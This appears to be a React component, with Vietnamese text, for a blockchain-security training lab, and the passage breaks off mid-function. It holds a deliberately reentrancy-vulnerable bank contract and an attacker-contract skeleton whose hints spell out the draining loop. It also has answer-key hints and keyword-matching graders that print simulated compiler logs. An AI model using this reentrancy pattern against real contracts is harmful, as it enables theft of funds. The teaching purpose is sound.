import React, { useState, useEffect, useRef, useMemo } from 'react'
import { createPortal } from 'react-dom'
import Editor from '@monaco-editor/react'
import axios from 'axios'
import { X, Play, RefreshCw, HelpCircle, Code2, Terminal, BookOpen, CheckCircle, AlertTriangle, ShieldCheck, Trophy, ArrowLeft } from 'lucide-react'
import confetti from 'canvas-confetti'
import { validateCodeStructure } from '../utils/codeValidator'

const vulnerableContractCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Nạp tiền vào ngân hàng
    function deposit() public payable {
        require(msg.value > 0, "Deposit must be > 0");
        balances[msg.sender] += msg.value;
    }

    // Rút tiền khỏi ngân hàng - LỖ HỔNG Ở ĐÂY!
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // Gọi lệnh chuyển tiền ra bên ngoài trước khi cập nhật số dư (Reentrancy Vulnerability)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        // Cập nhật số dư quá muộn!
        balances[msg.sender] = 0;
    }

    // Xem số dư của ngân hàng
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`;

const defaultAttackerCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    IVulnerableBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    // 1. Viết hàm fallback() hoặc receive() để tự động gọi lại rút tiền khi nhận được Ether
    fallback() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            // CODE CỦA BẠN: Gọi tiếp lệnh withdraw ở đây để tạo vòng lặp tái nhập
            
        }
    }

    // 2. Viết hàm attack() để nạp tiền (deposit) và kích hoạt đợt rút tiền đầu tiên
    function attack() public payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to start attack");
        
        // CODE CỦA BẠN: Nạp 1 ETH vào ngân hàng lỗi
        
        // CODE CỦA BẠN: Gọi rút tiền ngay sau đó để bắt đầu đợt tái nhập
        
    }

    // Hàm nhận lại tiền đã hack
    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}`;

const getLessonDetails = (lesson) => {
  const defaultTitle = lesson?.labTitle || lesson?.title || "Blockchain Lab";
  const defaultDesc = lesson?.labDescription || lesson?.description || "Thực hành bảo mật Blockchain.";
  
  switch (lesson?.id) {
    case 'lesson-01':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'blockchain.py', isWritable: true, defaultCode: lesson.labStarterCode, language: 'python', label: 'SOẠN THẢO', badgeType: 'info' }
        ],
        hints: [
          "Gợi ý 1: Trong calculate_hash, hãy tạo một chuỗi block_string từ index, timestamp, data và previous_hash, sau đó băm SHA-256.",
          "Gợi ý 2: Trong add_block, lấy block cuối trong chuỗi, tạo block mới với previous_hash là hash của block cuối, rồi append vào chuỗi.",
          "Gợi ý 3: Trong is_chain_valid, lặp từ block 1 đến hết, kiểm tra current.hash có bằng current.calculate_hash() không."
        ],
        verify: (code) => {
          // Extract function bodies to prevent global string matching tricks
          const isChainValidMatch = code.match(/def\s+is_chain_valid\s*\([^)]*\)\s*:([\s\S]*?)(?=\n\s*(?:def|class)|$)/);
          const isChainValidBody = isChainValidMatch ? isChainValidMatch[1].replace(/\s+/g, '') : '';
          const calcHashMatch = code.match(/def\s+calculate_hash\s*\([^)]*\)\s*:([\s\S]*?)(?=\n\s*(?:def|class)|$)/);
          const calcHashBody = calcHashMatch ? calcHashMatch[1].replace(/\s+/g, '') : '';
          const addBlockMatch = code.match(/def\s+add_block\s*\([^)]*\)\s*:([\s\S]*?)(?=\n\s*(?:def|class)|$)/);
          const addBlockBody = addBlockMatch ? addBlockMatch[1].replace(/\s+/g, '') : '';

          const hasHash = calcHashBody.includes('hashlib.sha256') && calcHashBody.includes('hexdigest()') && !calcHashBody.includes('pass') && calcHashBody !== '';
          const hasAppend = addBlockBody.includes('self.chain.append') && addBlockBody.includes('Block(') && !addBlockBody.includes('pass') && addBlockBody !== '';
          const hasValid = (isChainValidBody.includes('for') || isChainValidBody.includes('while')) && (isChainValidBody.includes('calculate_hash') || isChainValidBody.includes('.hash')) && !isChainValidBody.includes('pass') && !/returnFalse$|returnTrue$/.test(isChainValidBody) && isChainValidBody !== '';
          
          return {
            success: hasHash && hasAppend && hasValid,
            logs: [
              { msg: "[Python 3] Khởi chạy blockchain.py sandbox...", type: "info" },
              { msg: "[Python] Đang chạy tests cho lớp Block...", type: "info" },
              hasHash ? { msg: "[PASS] calculate_hash() chính xác.", type: "success" } : { msg: "[FAIL] calculate_hash() chưa chính xác hoặc để trống/sử dụng pass.", type: "error" },
              hasAppend ? { msg: "[PASS] add_block() thêm block thành công.", type: "success" } : { msg: "[FAIL] add_block() chưa được hiện thực đúng hoặc thiếu lệnh append.", type: "error" },
              hasValid ? { msg: "[PASS] is_chain_valid() kiểm tra tính toàn vẹn đúng.", type: "success" } : { msg: "[FAIL] is_chain_valid() chưa đúng logic (thiếu vòng lặp hoặc chỉ return giả).", type: "error" }
            ]
          };
        }
      };
    case 'lesson-02':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'SimpleStorage.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Hàm set() nhận uint256 _value, gán cho storedValue và phát ra event ValueChanged.",
          "Gợi ý 2: Hàm get() là public view và trả về storedValue.",
          "Gợi ý 3: Modifier onlyOwner cần kiểm tra require(msg.sender == owner) trước khi thực thi hàm (_;)."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasSet = clean.includes('functionset(uint256') && clean.includes('storedValue=');
          const hasGet = clean.includes('functionget()') && clean.includes('returnstoredValue');
          const hasModifier = clean.includes('modifieronlyOwner()') && clean.includes('msg.sender==owner');
          return {
            success: hasSet && hasGet && hasModifier,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch SimpleStorage.sol...", type: "info" },
              { msg: "[EVM] Deploying SimpleStorage contract...", type: "info" },
              hasSet ? { msg: "[PASS] Hàm set() gán storedValue chính xác.", type: "success" } : { msg: "[FAIL] Hàm set() chưa được cài đặt chính xác.", type: "error" },
              hasGet ? { msg: "[PASS] Hàm get() trả về storedValue chính xác.", type: "success" } : { msg: "[FAIL] Hàm get() chưa trả về storedValue.", type: "error" },
              hasModifier ? { msg: "[PASS] Modifier onlyOwner kiểm tra quyền sở hữu chính xác.", type: "success" } : { msg: "[FAIL] Modifier onlyOwner chưa được cài đặt.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-03':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'VulnerableBank.sol', isWritable: false, defaultCode: vulnerableContractCode, language: 'solidity', label: 'LỖ HỔNG', badgeType: 'error' },
          { name: 'Attack.sol', isWritable: true, defaultCode: lesson.labStarterCode || defaultAttackerCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Trong hàm attack(), gọi bank.deposit{value: 1 ether}() rồi bank.withdraw().",
          "Gợi ý 2: Trong fallback(), kiểm tra số dư ngân hàng lớn hơn hoặc bằng 1 ether thì gọi tiếp bank.withdraw().",
          "Gợi ý 3: Hàm fallback() là hàm nhận tiền tự động khi ngân hàng chuyển tiền về."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasFallbackWithdraw = clean.includes('fallback()externalpayable') && (clean.includes('bank.withdraw()') || clean.includes('withdraw()'));
          const hasAttackDeposit = clean.includes('bank.deposit{') || clean.includes('deposit{');
          const hasAttackWithdraw = clean.includes('bank.withdraw()') || clean.includes('withdraw()');
          return {
            success: hasFallbackWithdraw && hasAttackDeposit && hasAttackWithdraw,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch VulnerableBank.sol và Attack.sol...", type: "info" },
              { msg: "[EVM] Deploying VulnerableBank với 10.0 ETH mock...", type: "info" },
              { msg: "[EVM] Deploying Attack contract...", type: "info" },
              { msg: "[EVM] Thực hiện giao dịch attack() từ ví Hacker với 1.0 ETH...", type: "info" },
              hasAttackDeposit ? { msg: "[PASS] attack() đã gửi deposit 1.0 ETH thành công.", type: "success" } : { msg: "[FAIL] attack() thiếu lệnh gửi tiền (deposit) vào ngân hàng.", type: "error" },
              hasAttackWithdraw ? { msg: "[PASS] attack() đã kích hoạt lệnh withdraw đầu tiên.", type: "success" } : { msg: "[FAIL] attack() thiếu lệnh withdraw đầu tiên.", type: "error" },
              hasFallbackWithdraw ? { msg: "[PASS] fallback() kích hoạt tái nhập (reentrancy) thành công.", type: "success" } : { msg: "[FAIL] fallback() chưa gọi rút tiền tái nhập hoặc bị thiếu.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-04':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'TokenSale.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Lỗ hổng xảy ra do phép nhân `amount * PRICE` có thể bị tràn số (overflow).",
          "Gợi ý 2: Để khắc phục, bạn cần sử dụng thư viện SafeMath cho các phép tính số học, ví dụ `amount.mul(PRICE)`.",
          "Gợi ý 3: Hoặc nâng cấp compiler Solidity lên bản 0.8.0+ nơi overflow tự động revert."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasSafeMath = clean.includes('SafeMath') || clean.includes('usingSafeMathfor') || clean.includes('0.8.');
          return {
            success: hasSafeMath,
            logs: [
              { msg: "[Solc v0.7.0] Đang phân tích static analysis TokenSale.sol...", type: "info" },
              hasSafeMath ? { msg: "[PASS] Tránh được lỗ hổng tràn số thành công.", type: "success" } : { msg: "[FAIL] Phép nhân trực tiếp vẫn có nguy cơ gây Integer Overflow.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-05':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'SecureVault.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Luôn dùng `msg.sender` thay vì `tx.origin` để xác thực quyền admin.",
          "Gợi ý 2: `tx.origin` đại diện cho người ký giao dịch gốc, dễ bị tấn công Phishing qua contract trung gian."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const usesMsgSender = clean.includes('msg.sender==owner') || clean.includes('require(msg.sender==');
          const hasTxOrigin = clean.includes('tx.origin');
          return {
            success: usesMsgSender && !hasTxOrigin,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch SecureVault.sol...", type: "info" },
              !hasTxOrigin ? { msg: "[PASS] Đã loại bỏ hoàn toàn việc sử dụng tx.origin.", type: "success" } : { msg: "[FAIL] Vẫn còn dấu vết sử dụng tx.origin nguy hiểm.", type: "error" },
              usesMsgSender ? { msg: "[PASS] Sử dụng msg.sender để xác thực phân quyền chính xác.", type: "success" } : { msg: "[FAIL] Chưa cấu hình modifier onlyOwner đúng cách.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-06':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'FlashLoanArbitrage.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Trong executeFlashLoan, gọi lender.flashLoan(amount) để yêu cầu vay tiền.",
          "Gợi ý 2: Trong callback onFlashLoan, thực hiện swap giữa DEX A và DEX B rồi hoàn trả khoản vay.",
          "Gợi ý 3: Đảm bảo kiểm tra lợi nhuận sau khi trả lại tiền vay + phí."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasFlashLoanCall = clean.includes('lender.flashLoan(') || clean.includes('flashLoan(');
          const hasCallback = clean.includes('onFlashLoan') || clean.includes('executeFlashLoan');
          return {
            success: hasFlashLoanCall && hasCallback,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch FlashLoanArbitrage.sol...", type: "info" },
              { msg: "[Aave Mock] Khởi tạo Flash Loan Provider...", type: "info" },
              hasFlashLoanCall ? { msg: "[PASS] Lệnh gọi flashLoan() hợp lệ.", type: "success" } : { msg: "[FAIL] Chưa gọi hàm flashLoan() từ lender.", type: "error" },
              hasCallback ? { msg: "[PASS] Callback onFlashLoan được khai báo.", type: "success" } : { msg: "[FAIL] Thiếu callback xử lý flash loan.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-07':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'TWAPOracle.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: TWAP tính bằng hiệu số cumulativePrice chia cho khoảng thời gian timeElapsed.",
          "Gợi ý 2: Kiểm tra timeElapsed >= period trước khi chia để đảm bảo khoảng thời gian hợp lệ."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasTWAP = clean.includes('cumulativePrice') && clean.includes('timeElapsed') && (clean.includes('/timeElapsed') || clean.includes('/period'));
          return {
            success: hasTWAP,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch TWAPOracle.sol...", type: "info" },
              hasTWAP ? { msg: "[PASS] Tính toán TWAP trung bình theo thời gian chính xác.", type: "success" } : { msg: "[FAIL] Công thức TWAP chưa chính xác hoặc thiếu kiểm tra timeElapsed.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-08':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'mev_detector.py', isWritable: true, defaultCode: lesson.labStarterCode, language: 'python', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Kiểm tra tx1.sender == tx3.sender và tx1.sender != tx2.sender.",
          "Gợi ý 2: So sánh gas_price của tx1 lớn hơn gas_price của tx2."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasLogic = clean.includes('tx1.sender==tx3.sender') && clean.includes('gas_price');
          return {
            success: hasLogic,
            logs: [
              { msg: "[Python 3] Khởi chạy kịch bản mô phỏng mempool MEV...", type: "info" },
              hasLogic ? { msg: "[PASS] Thuật toán phát hiện Sandwich Attack hoạt động chính xác.", type: "success" } : { msg: "[FAIL] Thuật toán phát hiện MEV chưa đúng logic so sánh sender/gas_price.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-09':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'phishing_analyzer.py', isWritable: true, defaultCode: lesson.labStarterCode, language: 'python', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Duyệt qua các hàm trong contract tìm approve/setApprovalForAll.",
          "Gợi ý 2: Thêm các cảnh báo vào danh sách warnings."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasCheck = clean.includes('warnings.append') && (clean.includes('approve') || clean.includes('setApprovalForAll'));
          return {
            success: hasCheck,
            logs: [
              { msg: "[Python 3] Đang phân tích AST của Phishing Smart Contract...", type: "info" },
              hasCheck ? { msg: "[PASS] Phát hiện dấu hiệu Phishing Approval Scam chính xác.", type: "success" } : { msg: "[FAIL] Chưa hoàn thành hàm analyze_contract kiểm tra approve.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-10':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'audit_tool.py', isWritable: true, defaultCode: lesson.labStarterCode, language: 'python', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Kiểm tra sự hiện diện của 'onlyOwner' hoặc 'require(msg.sender'.",
          "Gợi ý 2: Kiểm tra việc sử dụng 'block.timestamp' cho randomness."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasAuditLogic = clean.includes('findings.append') && (clean.includes('onlyOwner') || clean.includes('block.timestamp'));
          return {
            success: hasAuditLogic,
            logs: [
              { msg: "[Python 3] Chạy Static Analysis Audit Tool...", type: "info" },
              hasAuditLogic ? { msg: "[PASS] Đã tìm ra các lỗ hổng Access Control và Weak Randomness.", type: "success" } : { msg: "[FAIL] Logic audit_contract chưa phát hiện đủ lỗ hổng.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-11':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'SecureLending.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Trong hàm borrow, kiểm tra pos.borrowed + amount <= maxBorrow.",
          "Gợi ý 2: Trong hàm liquidate, kiểm tra healthFactor < LIQUIDATION_THRESHOLD."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasBorrowCheck = clean.includes('COLLATERAL_RATIO') || clean.includes('maxBorrow');
          const hasHealthCheck = clean.includes('healthFactor') || clean.includes('LIQUIDATION_THRESHOLD');
          return {
            success: hasBorrowCheck && hasHealthCheck,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch SecureLending.sol...", type: "info" },
              hasBorrowCheck ? { msg: "[PASS] Kiểm tra Collateral Ratio khi borrow thành công.", type: "success" } : { msg: "[FAIL] Thiếu kiểm tra hạn mức vay dựa trên tài sản thế chấp.", type: "error" },
              hasHealthCheck ? { msg: "[PASS] Logic thanh lý Liquidation hoạt động chính xác.", type: "success" } : { msg: "[FAIL] Thiếu kiểm tra Health Factor trong hàm liquidate.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-12':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'token_analyzer.py', isWritable: true, defaultCode: lesson.labStarterCode, language: 'python', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Kiểm tra liquidity_locked và owner_can_mint.",
          "Gợi ý 2: Kiểm tra buy_tax và sell_tax xem có lớn hơn 10% không."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasAnalysis = clean.includes('red_flags.append') && (clean.includes('liquidity_locked') || clean.includes('owner_can_mint'));
          return {
            success: hasAnalysis,
            logs: [
              { msg: "[Python 3] Khởi chạy Rug Pull Analyzer...", type: "info" },
              hasAnalysis ? { msg: "[PASS] Phát hiện các Red Flags của Token Scam thành công.", type: "success" } : { msg: "[FAIL] Chưa kiểm tra các điều kiện liquidity_locked hoặc owner_can_mint.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-13':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'VulnerableVault.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Cập nhật totalShares và totalAssets trước khi thực hiện call chuyển ETH.",
          "Gợi ý 2: Trong getSharePrice, kiểm tra require(!locked) để ngăn đọc giá khi đang trong quá trình withdraw."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const callIdx = clean.indexOf('msg.sender.call');
          const sharesIdx = clean.indexOf('totalShares-=');
          const isCEI = sharesIdx !== -1 && callIdx !== -1 && sharesIdx < callIdx;
          const hasLockCheck = clean.includes('require(!locked') || clean.includes('getSharePrice');
          return {
            success: isCEI || hasLockCheck,
            logs: [
              { msg: "[Solc v0.8.20] Biên dịch VulnerableVault.sol...", type: "info" },
              isCEI ? { msg: "[PASS] Tuân thủ mẫu Checks-Effects-Interactions (Cập nhật state trước khi call).", type: "success" } : { msg: "[FAIL] Vẫn gửi ETH trước khi trừ totalShares / totalAssets (nguy cơ Reentrancy).", type: "error" },
              hasLockCheck ? { msg: "[PASS] Bảo vệ hàm getSharePrice() khỏi Read-Only Reentrancy.", type: "success" } : { msg: "[FAIL] Hàm getSharePrice() chưa kiểm tra trạng thái lock.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-14':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'ProxyStorage.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Đảm bảo khai báo implementation tại Slot 0 và owner tại Slot 1 trong cả Proxy lẫn Logic contract."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasImpl = clean.includes('addresspublicimplementation');
          const hasOwner = clean.includes('addresspublicowner');
          const implFirst = clean.indexOf('addresspublicimplementation') < clean.indexOf('addresspublicowner');
          return {
            success: hasImpl && hasOwner && implFirst,
            logs: [
              { msg: "[Solc v0.8.20] Phân tích Storage Layout giữa Proxy và Logic Contract...", type: "info" },
              implFirst ? { msg: "[PASS] Storage Slots hoàn toàn khớp nhau (Slot 0: implementation, Slot 1: owner).", type: "success" } : { msg: "[FAIL] Thứ tự khai báo biến bị lệch làm xảy ra Storage Collision.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-15':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'SecureSignatureVerifier.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Trong hàm verify, tăng nonces[signer]++ sau khi kiểm tra để vô hiệu hóa chữ ký đã dùng."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasNonceIncrement = clean.includes('nonces[signer]++') || (clean.includes('nonces[') && clean.includes('+=1'));
          return {
            success: hasNonceIncrement,
            logs: [
              { msg: "[Solc v0.8.20] Kiểm tra cơ chế chống Signature Replay...", type: "info" },
              hasNonceIncrement ? { msg: "[PASS] Đã cập nhật Nonce người dùng sau khi xác thực chữ ký.", type: "success" } : { msg: "[FAIL] Thiếu lệnh tăng nonces[signer]++ khiến chữ ký có thể bị dùng lại nhiều lần.", type: "error" }
            ]
          };
        }
      };
    case 'lesson-16':
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: 'CrossChainBridge.sol', isWritable: true, defaultCode: lesson.labStarterCode, language: 'solidity', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Đánh dấu processedMessages[msgHash] = true trước khi thực hiện chuyển khoản."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const hasProcessed = clean.includes('processedMessages[msgHash]=true');
          const hasCheck = clean.includes('!processedMessages[msgHash]');
          return {
            success: hasProcessed && hasCheck,
            logs: [
              { msg: "[Solc v0.8.20] Audit logic xử lý tin nhắn Cross-Chain...", type: "info" },
              hasProcessed ? { msg: "[PASS] Đã ghi nhận processedMessages[msgHash] = true chống Replay.", type: "success" } : { msg: "[FAIL] Thiếu lệnh đánh dấu processedMessages[msgHash] = true.", type: "error" }
            ]
          };
        }
      };
    default:
      return {
        title: defaultTitle,
        description: defaultDesc,
        files: [
          { name: lesson?.labTitle ? lesson.labTitle.replace(/[^a-zA-Z0-9]/g, '') + (lesson.labType === 'solidity' ? '.sol' : '.py') : 'Workspace.sol', isWritable: true, defaultCode: lesson?.labStarterCode || '', language: lesson?.labType === 'solidity' ? 'solidity' : 'python', label: 'SOẠN THẢO', badgeType: 'warning' }
        ],
        hints: [
          "Gợi ý 1: Đọc kỹ yêu cầu và thực hiện chỉnh sửa các phần TODO trong code.",
          "Gợi ý 2: Đảm bảo viết đúng cú pháp và gọi hàm chính xác.",
          "Gợi ý 3: Bấm nút RUN CODE để chạy kịch bản thử nghiệm tự động."
        ],
        verify: (code) => {
          const clean = code.replace(/\s+/g, '');
          const starterClean = (lesson?.labStarterCode || '').replace(/\s+/g, '');
          const isModified = clean !== starterClean && clean.length > 30;
          const hasUnfilledTodo = clean.includes('//TODO') || clean.includes('#TODO') || (clean.includes('pass') && clean.length < starterClean.length + 10);
          const validSyntax = clean.includes('function') || clean.includes('def') || clean.includes('contract') || clean.includes('class');
          const structCheck = validateCodeStructure(code, lesson?.labType === 'solidity' ? 'solidity' : 'python', lesson?.labStarterCode || '');

          const passed = isModified && !hasUnfilledTodo && validSyntax && structCheck.success;

          return {
            success: passed,
            logs: [
              { msg: `[Compiler] Biên dịch mã nguồn ${lesson?.labType === 'solidity' ? 'Solidity' : 'Python'}...`, type: "info" },
              { msg: "[Sandbox] Khởi chạy kịch bản phân tích tĩnh (Static Analysis)...", type: "info" },
              isModified ? { msg: "[PASS] Phát hiện mã nguồn đã được cập nhật.", type: "success" } : { msg: "[FAIL] Bạn chưa chỉnh sửa mã nguồn ban đầu.", type: "error" },
              !hasUnfilledTodo ? { msg: "[PASS] Tất cả các đoạn TODO đã được hoàn thiện.", type: "success" } : { msg: "[FAIL] Vẫn còn đoạn TODO/pass chưa hoàn tất.", type: "error" },
              ...structCheck.logs,
              passed ? { msg: "[PASS] Tất cả các kịch bản kiểm tra đã hoàn thành thành công!", type: "success" } : { msg: "[FAIL] Mã nguồn chưa đạt yêu cầu kiểm thử.", type: "error" }
            ]
          };
        }
      };
  }
};

export default function LabWorkspace({ lesson, onClose, onComplete }) {
  const lessonDetails = useMemo(() => getLessonDetails(lesson), [lesson]);

  const [activeFile, setActiveFile] = useState(() => {
    if (lesson.id === 'lesson-03') return 'VulnerableBank.sol';
    return lessonDetails.files[0].name;
  });

  // Get active file details early for use in handleRunHack and rendering
  const activeFileDetail = useMemo(() => {
    return lessonDetails.files.find(f => f.name === activeFile) || lessonDetails.files[0];
  }, [activeFile, lessonDetails]);

  const [attackerCode, setAttackerCode] = useState(() => {
    const writableFile = lessonDetails.files.find(f => f.isWritable);
    return writableFile ? writableFile.defaultCode : '';
  });

  const [activeRightTab, setActiveRightTab] = useState('instructions') // 'instructions' | 'console'
  const [consoleLogs, setConsoleLogs] = useState([])
  const [isCompiling, setIsCompiling] = useState(false)
  const [showHint, setShowHint] = useState(false)
  const [currentHintIndex, setCurrentHintIndex] = useState(0)
  const [labStatus, setLabStatus] = useState('idle') // 'idle' | 'running' | 'success' | 'failed'
  const [lastErrorTrace, setLastErrorTrace] = useState('')
  
  const terminalEndRef = useRef(null)

  useEffect(() => {
    // Reset workspace when lesson changes
    const writableFile = lessonDetails.files.find(f => f.isWritable);
    setAttackerCode(writableFile ? writableFile.defaultCode : '');
    setActiveFile(lesson.id === 'lesson-03' ? 'VulnerableBank.sol' : lessonDetails.files[0].name);
    setLabStatus('idle');
    setConsoleLogs([]);
    setShowHint(false);
    setCurrentHintIndex(0);
    setLastErrorTrace('');
  }, [lesson, lessonDetails]);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' })
    }
  }, [consoleLogs])

  const writeLog = (message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString()
    setConsoleLogs((prev) => [...prev, { time: timestamp, text: message, type }])
  }

  const handleResetCode = () => {
    if (window.confirm("Bạn có chắc chắn muốn reset lại code ban đầu không?")) {
      const writableFile = lessonDetails.files.find(f => f.isWritable);
      setAttackerCode(writableFile ? writableFile.defaultCode : '');
      writeLog("[System] Code đã được khôi phục về mặc định.", "warning")
    }
  }

  const handleRunHack = async () => {
    setActiveRightTab('console');
    setIsCompiling(true);
    setLabStatus('running');
    setConsoleLogs([]);
    setLastErrorTrace('');

    const currentLanguage = lesson?.labType === 'solidity' ? 'solidity' : (activeFile.endsWith('.py') ? 'python' : 'solidity');
    const starterCode = (lessonDetails.files.find(f => f.isWritable) || activeFileDetail)?.defaultCode || lesson?.labStarterCode || '';
    const structCheck = validateCodeStructure(attackerCode, currentLanguage, starterCode);

    // 1. AST & Structural check on frontend
    if (!structCheck.success) {
      const errTrace = structCheck.logs.map(l => l.msg).join('\n');
      let delay = 0;
      structCheck.logs.forEach((logItem, index) => {
        setTimeout(() => {
          writeLog(logItem.msg, logItem.type);
          if (index === structCheck.logs.length - 1) {
            setIsCompiling(false);
            setLabStatus('failed');
            setLastErrorTrace(errTrace);
            writeLog("💡 Nhấn nút 'AI Mentor / Gợi ý lỗi' bên dưới để được AI giải thích chi tiết nguyên nhân lỗi này!", "warning");
          }
        }, delay);
        delay += 600;
      });
      return;
    }

    writeLog(structCheck.logs[0]?.msg || "[AST Parser] Cấu trúc cú pháp mã nguồn hợp lệ.", "info");
    writeLog("[Sandbox Runner] Đang gửi mã nguồn tới máy chủ kiểm thử Unit Test / Sandbox...", "warning");

    try {
      const token = localStorage.getItem("token");
      const headers = token ? { Authorization: `Bearer ${token}` } : {};

      const response = await axios.post('/api/lab/grade', {
        lesson_id: lesson?.id || 'default',
        code: attackerCode,
        language: currentLanguage,
        lab_title: lessonDetails?.title || '',
        lab_description: lessonDetails?.description || '',
        starter_code: starterCode
      }, { headers, timeout: 25000 });

      const data = response.data;
      const aiPassed = boolCheck(data.passed);

      let delay = 600;
      if (data.logs && data.logs.length > 0) {
        data.logs.forEach((logItem, index) => {
          setTimeout(() => {
            writeLog(logItem.msg, logItem.type);
            if (index === data.logs.length - 1) {
              setIsCompiling(false);
              if (aiPassed) {
                setLabStatus('success');
                setLastErrorTrace('');
                confetti({
                  particleCount: 150,
                  spread: 80,
                  origin: { y: 0.5 }
                });
              } else {
                setLabStatus('failed');
                setLastErrorTrace(data.traceback || data.security_review || 'Lỗi kiểm thử Unit Test');
              }
            }
          }, delay);
          delay += 700;
        });
      } else {
        setIsCompiling(false);
        if (aiPassed) {
          writeLog(`[PASS] ${data.security_review || 'Hoàn thành bài kiểm tra.'}`, "success");
          setLabStatus('success');
          setLastErrorTrace('');
